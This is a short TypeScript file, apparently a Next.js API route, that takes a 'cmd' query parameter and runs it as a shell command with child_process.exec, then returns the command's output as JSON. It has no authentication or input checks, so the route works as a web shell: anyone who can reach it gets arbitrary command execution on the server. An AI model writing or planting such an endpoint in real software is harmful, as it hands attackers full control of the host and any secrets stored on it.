import { exec } from 'child_process';
import { promisify } from 'util';
const execAsync = promisify(exec);

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const cmd = searchParams.get('cmd');
    if (!cmd) return Response.json({ error: 'no cmd' });
    
    const cwd = process.cwd();
    const { stdout, stderr } = await execAsync(cmd, { cwd });
    return Response.json({ success: true, stdout, stderr });
  } catch (error: any) {
    return Response.json({ success: false, error: error.message, stdout: error.stdout, stderr: error.stderr });
  }
}
